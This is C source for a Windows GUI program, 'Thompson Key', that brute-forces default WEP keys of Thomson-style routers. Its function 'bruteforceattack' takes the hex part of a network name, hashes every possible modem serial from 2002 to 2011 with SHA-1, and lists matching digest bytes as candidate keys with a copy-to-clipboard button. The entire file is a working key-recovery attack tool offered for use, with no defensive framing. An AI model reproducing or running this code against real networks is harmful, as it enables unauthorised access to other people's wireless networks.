#include <windows.h>
#include <CommCtrl.h>
 
#include "sha1.h"
//-static-libgcc -static-libstdc++
typedef unsigned char u8;
typedef unsigned int u32;

const u8 charTable[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const u8 hexTable[]="0123456789ABCDEF";
      u8 serial[13]={'C','P','0',0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

#define SERIAL_LENGTH 12
#define MAX_SSID_OCTETS 6
#define DEFAULT_KEY_SIZE 5

#define hexmsb(x)(hexTable[((x & 0xf0) >> 4)])
#define hexlsb(x)(hexTable[ (x & 0x0f)])
#define toupper(x) ( ((x)>='a' && (x)<='f')?(x)&0xdf:(x) )
HWND hwndWindow, hwndCmd, hwndEdit, hwndList, hwndCmdCopy, hwndCmdHelp, hwndProgress;


u32 str2ssid(u8 ssid[], u8 *str) {

    u8 *p,*q = ssid;
    u32 len = strlen((char*)str);

    if( (len % 2) || (len > MAX_SSID_OCTETS) )
      return(0);

    for(p = str;(*p = toupper(*p)) && (strchr((char*)hexTable,*p)) != 0;) {

      if(--len % 2) {
        *q = ((u8*)strchr((char*)hexTable,*p++) - hexTable);
        *q <<= 4;
      } else {
        *q++ |= ((u8*)strchr((char*)hexTable,*p++) - hexTable);
      }
    }
    return( (len) ? 0 : (p - str) / 2);
}

DWORD WINAPI bruteforceattack( LPVOID lpParam ) {
	u8 *strId = (u8*)lpParam;
	u8 sha1_digest[40]={0};
    u8 ssid[8]={0},buf[8]={0},year,week,x1,x2,x3;
    u32 keys = 0,ssidLen = 0,verbose = 0, opt = 0;
	SHA1Context sha1_ctx;

    if(!(ssidLen = str2ssid(ssid,strId))) {
        EnableWindow(hwndEdit,true);
        EnableWindow(hwndCmd,true);
		MessageBox(hwndWindow,"Invalid SSID","Error",MB_ICONEXCLAMATION);
		return 0;
	 }
//016C = 10 years x 52 weeks in hex
	SendMessage(hwndProgress,PBM_SETRANGE ,0, (LPARAM)0x02080000);
	 
    for(year = 2;year <= 11;year++) {
          serial[2] = ((year/10) % 10) | '0';	// decade
          serial[3] = (year % 10) | '0';		// monade
          
		  // 52 weeks of the year
          for(week = 1;week <= 52;week++) {
            SendMessage(hwndProgress,PBM_SETPOS ,(year-2)*52+week,NULL);
            serial[4] = (week / 10) + '0';	// decade
            serial[5] = (week % 10) + '0';	// monade

            for(x1 = 0;x1 < 36;x1++) {

              serial[6] = hexmsb(charTable[x1]);
              serial[7] = hexlsb(charTable[x1]);

              for(x2 = 0;x2 < 36;x2++) {

                serial[8] = hexmsb(charTable[x2]);
                serial[9] = hexlsb(charTable[x2]);

                for(x3 = 0;x3 < 36;x3++) {

                  serial[10] = hexmsb(charTable[x3]);
                  serial[11] = hexlsb(charTable[x3]);

                  // hash serial number with sha-1

                  SHA1Reset(&sha1_ctx);
                  SHA1Input(&sha1_ctx,serial,SERIAL_LENGTH);
                  SHA1Result(&sha1_ctx,sha1_digest);

                  // compare SSID octets with last number of bytes supplied

                  if(memcmp(&sha1_digest[(20-ssidLen)],ssid,ssidLen) == 0) {

					memcpy(buf,serial,6);

					// sha1_digest;
					char ssidD[11]; 

					ssidD[0] = hexmsb(sha1_digest[0]);
					ssidD[1] = hexlsb(sha1_digest[0]);
					ssidD[2] = hexmsb(sha1_digest[1]);
					ssidD[3] = hexlsb(sha1_digest[1]);
					ssidD[4] = hexmsb(sha1_digest[2]);
					ssidD[5] = hexlsb(sha1_digest[2]);
					ssidD[6] = hexmsb(sha1_digest[3]);
					ssidD[7] = hexlsb(sha1_digest[3]);
					ssidD[8] = hexmsb(sha1_digest[4]);
					ssidD[9] = hexlsb(sha1_digest[4]);
					ssidD[10] = 0;
					
					SendMessage(hwndList,LB_INSERTSTRING,-1,(LPARAM)ssidD);
                }
              }
            }
          }
        }
	}
	EnableWindow(hwndEdit,true);
	EnableWindow(hwndCmd,true);
		MessageBeep(0);
	return 0;
}


void clipboardSetText(char* sText){
    HGLOBAL hText;
	char *pText;
	hText = GlobalAlloc(GMEM_DDESHARE|GMEM_MOVEABLE, strlen(sText)+1);
	pText = (char*)GlobalLock(hText);
	strcpy(pText, sText);
	GlobalUnlock(hText);
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hText);
	CloseClipboard();
}

LRESULT CALLBACK gdi01_WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam){
  switch(uMsg)
  {
  case WM_CREATE:
	  return 0L;
  case WM_DESTROY:

	   PostQuitMessage(0);
	   return 0L;

  case WM_COMMAND:
	  {
		  if ((HWND)lParam == hwndCmd){
			u8 *ssid = (u8*)malloc(7); 
			GetWindowText(hwndEdit,(LPSTR)ssid,7);

			EnableWindow(hwndEdit,false);
			EnableWindow(hwndCmd,false);
			SendMessage(hwndList,LB_RESETCONTENT,0,NULL);
			DWORD tid;
			HANDLE handle = CreateThread (NULL, 0, bruteforceattack, ssid,  NULL, &tid);
			//bruteforceattack(ssid);
			//SendMessage(hwndList,LB_INSERTSTRING,-1,(LPARAM)ssid);
		  }else if ((HWND)lParam == hwndCmdCopy){
			  char selItemData[11];
			  int selectIndex;
			  selectIndex = SendMessage(hwndList, LB_GETCURSEL , 0, NULL);
			  if (selectIndex > -1){
				SendMessage(hwndList, LB_GETTEXT, selectIndex, (LPARAM)selItemData);
				clipboardSetText(selItemData);
			  }
		  }else if ((HWND)lParam == hwndCmdHelp){
			  MessageBox(hwndWindow,"Enter the 6 hex digits of the wireless network name in the box (case insensitive). The application will only find the candidate default WEP keys if the modem was built in the period 2002-2011. Any serials found will be added in the list. You can select a serial and click copy.\n\nCredits:\n - GUI Design: Eleftheriadis E\n - BFA Algorithm: Devine K.","Help",MB_ICONINFORMATION);
		  }
		  return 0L;
	  }
  }  

  return DefWindowProc(hwnd,uMsg,wParam,lParam);
}  


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hInstPrev, LPSTR lpszCmdLine, int nCmdShow){
  WNDCLASS wc = {
    0,
    gdi01_WindowProc,
    0,0,
    hInstance,
    LoadIcon(NULL,MAKEINTRESOURCE(4)),
    LoadCursor(NULL,IDC_ARROW),
    (HBRUSH)(COLOR_WINDOW),
    NULL,
	"CSPEED"
  };
  RegisterClass(&wc);
 


  hwndWindow = CreateWindowEx(
    0 ,
    "CSPEED","Thompson Key",
    WS_OVERLAPPED |WS_CAPTION| WS_SYSMENU | WS_MINIMIZEBOX,
    (GetSystemMetrics(SM_CXSCREEN) - 290)/3,(GetSystemMetrics(SM_CYSCREEN)-416)/3,290,416,
    HWND_DESKTOP,NULL,hInstance,NULL);

 hwndCmd = CreateWindowEx(
    0 ,
    "Button","Get Key",
	WS_CHILDWINDOW | WS_VISIBLE,
    100,10,80,30,
    hwndWindow,NULL,hInstance,NULL);
 
 hwndCmdHelp = CreateWindowEx(
    0 ,
    "Button","Help",
	WS_CHILDWINDOW | WS_VISIBLE,
    190,10,80,30,
    hwndWindow,NULL,hInstance,NULL);

 hwndEdit = CreateWindowEx(
	WS_EX_CLIENTEDGE,
    "Edit","",
	WS_CHILDWINDOW | WS_VISIBLE,
    10,10,80,30,
    hwndWindow,NULL,hInstance,NULL);

 hwndList = CreateWindowEx(
	WS_EX_CLIENTEDGE,
    "ListBox","",
	WS_CHILDWINDOW | WS_VISIBLE | WS_VSCROLL,
    10,50,260,300,
    hwndWindow,NULL,hInstance,NULL);
   
  hwndCmdCopy = CreateWindowEx(
    0 ,
    "Button","Copy",
	WS_CHILDWINDOW | WS_VISIBLE,
    190,344,80,30,
    hwndWindow,NULL,hInstance,NULL);

    hwndProgress = CreateWindowEx(
	0,
    "msctls_progress32","Progress",
	WS_CHILDWINDOW | WS_VISIBLE | PBS_SMOOTH,
    10,344,170,30,
    hwndWindow,NULL,hInstance,NULL);

   ShowWindow(hwndWindow,nCmdShow);
  
   SendMessage(hwndEdit,EM_SETLIMITTEXT,6,NULL);



  MSG msg;
  while(GetMessage(&msg,0,0,0))
  {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
  return msg.wParam;
}
